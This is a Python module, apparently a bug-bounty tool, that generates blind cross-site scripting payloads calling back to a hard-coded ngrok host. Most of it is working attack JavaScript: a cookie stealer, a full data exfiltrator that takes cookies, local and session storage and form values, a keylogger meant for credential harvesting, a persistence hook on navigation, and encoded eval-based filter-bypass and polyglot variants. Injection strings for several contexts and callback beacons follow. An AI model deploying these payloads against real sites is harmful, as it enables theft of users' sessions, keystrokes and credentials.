#!/usr/bin/env python3
"""
🔥 XSSHUNTER-STYLE ENHANCED BLIND XSS
Advanced blind XSS techniques for bug bounty hunting inspired by XSSHunter
"""

import logging
import base64
import json
import time
import uuid
from typing import List, Dict, Optional

logger = logging.getLogger(__name__)

class XSSHunterEnhanced:
    """XSSHunter-style advanced blind XSS for bug bounty hunting."""

    def __init__(self, callback_domain: str = "kind-extremely-skylark.ngrok-free.app"):
        self.callback_domain = callback_domain
        self.session_id = str(uuid.uuid4())[:8]

    def generate_advanced_payload(self, xss_id: str, payload_type: str = "comprehensive") -> str:
        """Generate advanced XSSHunter-style payloads with data exfiltration."""

        callback_url = f"http://{self.callback_domain}/xss/{xss_id}"

        payloads = {
            "comprehensive": self._generate_comprehensive_payload(callback_url, xss_id),
            "cookie_stealer": self._generate_cookie_stealer(callback_url, xss_id),
            "dom_inspector": self._generate_dom_inspector(callback_url, xss_id),
            "keylogger": self._generate_keylogger(callback_url, xss_id),
            "screenshot": self._generate_screenshot_payload(callback_url, xss_id),
            "persistent": self._generate_persistent_payload(callback_url, xss_id),
            "waf_bypass": self._generate_waf_bypass_payload(callback_url, xss_id)
        }

        return payloads.get(payload_type, payloads["comprehensive"])

    def _generate_comprehensive_payload(self, callback_url: str, xss_id: str) -> str:
        """Generate comprehensive data exfiltration payload."""
        payload = f"""
<script>
(function() {{
    var xssId = '{xss_id}';
    var callbackUrl = '{callback_url}';

    // Comprehensive data collection
    var data = {{
        id: xssId,
        timestamp: new Date().toISOString(),
        url: location.href,
        referrer: document.referrer,
        userAgent: navigator.userAgent,
        cookies: document.cookie,
        localStorage: JSON.stringify(localStorage),
        sessionStorage: JSON.stringify(sessionStorage),
        origin: location.origin,
        title: document.title,
        innerHeight: window.innerHeight,
        innerWidth: window.innerWidth,
        domain: document.domain
    }};

    // Collect form data
    var forms = Array.from(document.forms).map(form => {{
        return {{
            action: form.action,
            method: form.method,
            inputs: Array.from(form.elements).map(el => {{
                return {{
                    name: el.name,
                    type: el.type,
                    value: el.type === 'password' ? '[REDACTED]' : el.value
                }};
            }})
        }};
    }});
    data.forms = forms;

    // Collect links
    data.links = Array.from(document.links).slice(0, 20).map(link => link.href);

    // Try to get admin/sensitive info
    var adminSelectors = ['[class*="admin"]', '[id*="admin"]', '[class*="dashboard"]', '[id*="dashboard"]'];
    data.adminElements = adminSelectors.map(sel => {{
        var els = document.querySelectorAll(sel);
        return els.length > 0 ? sel + ': ' + els.length : null;
    }}).filter(Boolean);

    // Check for frameworks
    data.frameworks = {{
        jquery: typeof jQuery !== 'undefined',
        angular: typeof angular !== 'undefined',
        react: typeof React !== 'undefined',
        vue: typeof Vue !== 'undefined'
    }};

    // Send data via multiple methods for reliability
    var payload = btoa(JSON.stringify(data));

    // Method 1: Image beacon
    new Image().src = callbackUrl + '?data=' + encodeURIComponent(payload);

    // Method 2: Fetch if available
    if (typeof fetch !== 'undefined') {{
        fetch(callbackUrl, {{
            method: 'POST',
            body: JSON.stringify(data),
            headers: {{'Content-Type': 'application/json'}}
        }}).catch(() => {{}});
    }}

    // Method 3: XMLHttpRequest fallback
    try {{
        var xhr = new XMLHttpRequest();
        xhr.open('POST', callbackUrl, true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.send(JSON.stringify(data));
    }} catch(e) {{}}
}})();
</script>"""
        return payload.strip()

    def _generate_cookie_stealer(self, callback_url: str, xss_id: str) -> str:
        """Generate focused cookie stealing payload."""
        return f"""<img src=x onerror="fetch('{callback_url}?cookies='+btoa(document.cookie)+'&id={xss_id}')">"""

    def _generate_dom_inspector(self, callback_url: str, xss_id: str) -> str:
        """Generate DOM inspection and exfiltration payload."""
        payload = f"""
<script>
setTimeout(function() {{
    var dom_data = {{
        id: '{xss_id}',
        html: document.documentElement.outerHTML.slice(0, 5000),
        scripts: Array.from(document.scripts).map(s => s.src).filter(Boolean),
        stylesheets: Array.from(document.styleSheets).map(s => s.href).filter(Boolean),
        meta: Array.from(document.getElementsByTagName('meta')).map(m => {{
            return {{name: m.name, content: m.content}};
        }})
    }};

    fetch('{callback_url}', {{
        method: 'POST',
        body: JSON.stringify(dom_data)
    }}).catch(() => {{
        new Image().src = '{callback_url}?dom=' + btoa(JSON.stringify(dom_data).slice(0, 1000));
    }});
}}, 1000);
</script>"""
        return payload.strip()

    def _generate_keylogger(self, callback_url: str, xss_id: str) -> str:
        """Generate keylogger payload for credential harvesting."""
        payload = f"""
<script>
(function() {{
    var keys = [];
    var xssId = '{xss_id}';

    document.addEventListener('keypress', function(e) {{
        keys.push({{
            key: e.key,
            code: e.code,
            timestamp: Date.now(),
            target: e.target.name || e.target.id || e.target.tagName
        }});

        // Send every 50 keystrokes or on form submit
        if (keys.length >= 50) {{
            sendKeys();
        }}
    }});

    document.addEventListener('submit', function() {{
        sendKeys();
    }});

    function sendKeys() {{
        if (keys.length === 0) return;

        var data = {{
            id: xssId,
            keystrokes: keys,
            url: location.href,
            timestamp: Date.now()
        }};

        fetch('{callback_url}/keylog', {{
            method: 'POST',
            body: JSON.stringify(data)
        }}).catch(() => {{}});

        keys = [];
    }}

    // Send remaining keys on page unload
    window.addEventListener('beforeunload', sendKeys);
}})();
</script>"""
        return payload.strip()

    def _generate_screenshot_payload(self, callback_url: str, xss_id: str) -> str:
        """Generate payload that attempts to capture screenshots."""
        payload = f"""
<script>
(function() {{
    // Try html2canvas if available
    if (typeof html2canvas !== 'undefined') {{
        html2canvas(document.body).then(canvas => {{
            var img = canvas.toDataURL('image/png');
            fetch('{callback_url}/screenshot', {{
                method: 'POST',
                body: JSON.stringify({{
                    id: '{xss_id}',
                    screenshot: img,
                    url: location.href
                }})
            }});
        }});
    }} else {{
        // Fallback: capture DOM structure
        var domCapture = {{
            id: '{xss_id}',
            title: document.title,
            body: document.body.innerText.slice(0, 2000),
            forms: document.forms.length,
            inputs: document.querySelectorAll('input').length,
            timestamp: Date.now()
        }};

        fetch('{callback_url}/domcapture', {{
            method: 'POST',
            body: JSON.stringify(domCapture)
        }});
    }}
}})();
</script>"""
        return payload.strip()

    def _generate_persistent_payload(self, callback_url: str, xss_id: str) -> str:
        """Generate persistent payload that survives navigation."""
        payload = f"""
<script>
(function() {{
    var xssId = '{xss_id}';
    var callbackUrl = '{callback_url}';

    // Store in localStorage for persistence
    localStorage.setItem('xss_persistent_' + xssId, JSON.stringify({{
        callback: callbackUrl,
        id: xssId,
        installed: Date.now()
    }}));

    // Hook into navigation events
    var originalPushState = history.pushState;
    history.pushState = function() {{
        originalPushState.apply(history, arguments);
        reportNavigation();
    }};

    var originalReplaceState = history.replaceState;
    history.replaceState = function() {{
        originalReplaceState.apply(history, arguments);
        reportNavigation();
    }};

    window.addEventListener('popstate', reportNavigation);

    function reportNavigation() {{
        setTimeout(function() {{
            fetch(callbackUrl + '/navigation', {{
                method: 'POST',
                body: JSON.stringify({{
                    id: xssId,
                    url: location.href,
                    timestamp: Date.now(),
                    persistent: true
                }})
            }});
        }}, 100);
    }}

    // Report initial execution
    fetch(callbackUrl + '/persistent', {{
        method: 'POST',
        body: JSON.stringify({{
            id: xssId,
            url: location.href,
            timestamp: Date.now(),
            action: 'installed'
        }})
    }});
}})();
</script>"""
        return payload.strip()

    def _generate_waf_bypass_payload(self, callback_url: str, xss_id: str) -> str:
        """Generate WAF bypass payload using various encoding techniques."""
        # Base64 encoded payload
        payload_data = f"fetch('{callback_url}?id={xss_id}&data='+btoa(document.cookie))"
        encoded_payload = base64.b64encode(payload_data.encode()).decode()

        bypass_techniques = [
            # Unicode encoding
            f"<img src=x onerror=\"\\u0065\\u0076\\u0061\\u006c(atob('{encoded_payload}'))\">",

            # HTML entity encoding
            f"<svg onload=\"&#101;&#118;&#97;&#108;(atob('{encoded_payload}'))\">",

            # JavaScript string concatenation
            f"<script>{'eval'}('f'+'etch(\\'{callback_url}?id={xss_id}&data=\\'+btoa(document.cookie))')</script>",

            # Template literal bypass
            f"<script>eval(`${{`f${{`etch`}}`}}('\\{callback_url}?id={xss_id}&data='+btoa(document.cookie))`)</script>",

            # Event handler bypass
            f"<img src=x onerror=\"this['on'+'error']=null;fetch('{callback_url}?id={xss_id}&data='+btoa(document.cookie))\">",

            # DOM manipulation bypass
            f"<script>document.createElement('img').src='{callback_url}?id={xss_id}&data='+btoa(document.cookie)</script>"
        ]

        return bypass_techniques[0]  # Return first bypass technique

    def generate_polyglot_payload(self, xss_id: str) -> str:
        """Generate polyglot payload that works in multiple contexts."""
        callback_url = f"http://{self.callback_domain}/xss/{xss_id}"

        polyglot = f"""jaVasCript:/*-/*`/*\\`/*'/*"/**/(/* */onerror=alert('{xss_id}'))//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert('{xss_id}')//></stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=fetch('{callback_url}?polyglot=1')//"""

        return polyglot

    def get_context_specific_payloads(self, xss_id: str) -> Dict[str, List[str]]:
        """Get context-specific XSS payloads for different injection points."""
        callback_url = f"http://{self.callback_domain}/xss/{xss_id}"

        return {
            "html_attribute": [
                f"\" onmouseover=\"fetch('{callback_url}?context=attr')\" x=\"",
                f"' autofocus onfocus='fetch(\\'{callback_url}?context=attr\\')' x='",
                f"\" onload=\"fetch('{callback_url}?context=attr')\" x=\""
            ],
            "javascript_string": [
                f"'; fetch('{callback_url}?context=js'); var x='",
                f"\"; fetch('{callback_url}?context=js'); var x=\"",
                f"\\'; fetch(\\'{callback_url}?context=js\\'); var x=\\'"
            ],
            "html_tag": [
                f"<img src=x onerror=\"fetch('{callback_url}?context=tag')\">",
                f"<svg onload=\"fetch('{callback_url}?context=tag')\">",
                f"<script>fetch('{callback_url}?context=tag')</script>"
            ],
            "url_parameter": [
                f"javascript:fetch('{callback_url}?context=url')",
                f"data:text/html,<script>fetch('{callback_url}?context=url')</script>",
                f"http://{self.callback_domain}/xss/{xss_id}?context=url"
            ],
            "css_injection": [
                f"expression(fetch('{callback_url}?context=css'))",
                f"</style><script>fetch('{callback_url}?context=css')</script><style>",
                f"/**/</style><script>fetch('{callback_url}?context=css')</script>/*"
            ]
        }

    def get_advanced_blind_payloads(self, xss_id: str) -> List[str]:
        """Get advanced blind XSS payloads for bug bounty hunting."""
        callback_url = f"http://{self.callback_domain}/xss/{xss_id}"

        return [
            # Standard callback
            f"<script src='{callback_url}.js'></script>",

            # Image beacon
            f"<img src='{callback_url}/img.gif'>",

            # CSS import
            f"<style>@import '{callback_url}/style.css';</style>",

            # Fetch API
            f"<script>fetch('{callback_url}/fetch')</script>",

            # XMLHttpRequest
            f"<script>new XMLHttpRequest().open('GET','{callback_url}/xhr',true).send()</script>",

            # WebSocket (if supported)
            f"<script>new WebSocket('{callback_url.replace('http', 'ws')}/ws')</script>",

            # Iframe src
            f"<iframe src='{callback_url}/iframe'></iframe>",

            # Form action
            f"<form action='{callback_url}/form' method=post><input name=xss value='{xss_id}'></form>",

            # Link prefetch
            f"<link rel=prefetch href='{callback_url}/prefetch'>",

            # DNS prefetch
            f"<link rel=dns-prefetch href='//{self.callback_domain}'>",

            # Service Worker
            f"<script>navigator.serviceWorker.register('{callback_url}/sw.js')</script>",

            # Web Worker
            f"<script>new Worker('{callback_url}/worker.js')</script>"
        ]

    def generate_mutation_payloads(self, base_payload: str, xss_id: str) -> List[str]:
        """Generate mutations of a base payload to bypass filters."""
        mutations = []
        callback_url = f"http://{self.callback_domain}/xss/{xss_id}"

        # Case variations
        mutations.append(base_payload.upper())
        mutations.append(base_payload.lower())

        # HTML entity encoding
        encoded = ""
        for char in base_payload:
            if char.isalpha():
                encoded += f"&#{ord(char)};"
            else:
                encoded += char
        mutations.append(encoded)

        # URL encoding
        url_encoded = ""
        for char in base_payload:
            if char in "<>\"'":
                url_encoded += f"%{ord(char):02x}"
            else:
                url_encoded += char
        mutations.append(url_encoded)

        # Unicode encoding
        unicode_encoded = ""
        for char in base_payload:
            if char in "<>\"'()":
                unicode_encoded += f"\\u{ord(char):04x}"
            else:
                unicode_encoded += char
        mutations.append(unicode_encoded)

        return mutations

    def get_payload_report(self, xss_id: str) -> str:
        """Generate comprehensive payload report for testing."""
        callback_url = f"http://{self.callback_domain}/xss/{xss_id}"

        report = f"""
🔥 XSSHUNTER ENHANCED PAYLOAD REPORT
XSS ID: {xss_id}
Callback Domain: {self.callback_domain}
Callback URL: {callback_url}

📋 PAYLOAD TYPES AVAILABLE:
1. Comprehensive Data Exfiltration
2. Cookie Stealer
3. DOM Inspector
4. Keylogger
5. Screenshot Capture
6. Persistent XSS
7. WAF Bypass Techniques
8. Context-Specific Payloads
9. Polyglot Payloads
10. Mutation Variations

🎯 USAGE:
- Test these payloads in forms, parameters, headers
- Monitor {self.callback_domain} for callbacks
- Check for blind XSS in admin panels, emails, logs
- Use persistent payloads for long-term monitoring

⚠️ BUG BOUNTY FOCUS:
- Blind XSS often pays higher than reflected
- Test in contact forms, user profiles, admin dashboards
- Look for XSS in error messages, logs, analytics
"""
        return report